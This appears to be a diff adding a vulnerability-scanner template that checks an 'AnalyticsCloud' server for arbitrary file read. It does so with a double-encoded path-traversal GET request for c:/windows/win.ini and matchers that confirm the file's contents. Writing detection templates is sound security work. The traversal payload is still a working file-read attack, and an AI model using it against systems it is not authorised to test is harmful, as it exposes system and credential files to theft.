@@ -1,0 +1,29 @@
+id: analyticscloud-anyfile-read
+info:
+  name: AnalyticsCloud Arbitrary File Read Vulnerability
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: file-read
+http:
+  - method: GET
+    path:
+      - "/a/.%252e/.%252e/.%252e/.%252e/.%252e/.%252e/.%252e/.%252e/.%252e/.%252e/.%252e/.%252e/.%252e/.%252e/.%252e/.%252e/.%252e/.%252e/.%252e/.%252e/c:/windows/win.ini"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "; for 16-bit app support"
+          - "[files]"
+        part: body
+      - type: word
+        words:
+          - "text/plain"
+        part: header
+      - type: word
+        words:
+          - "<"
+        part: body
+        negative: true
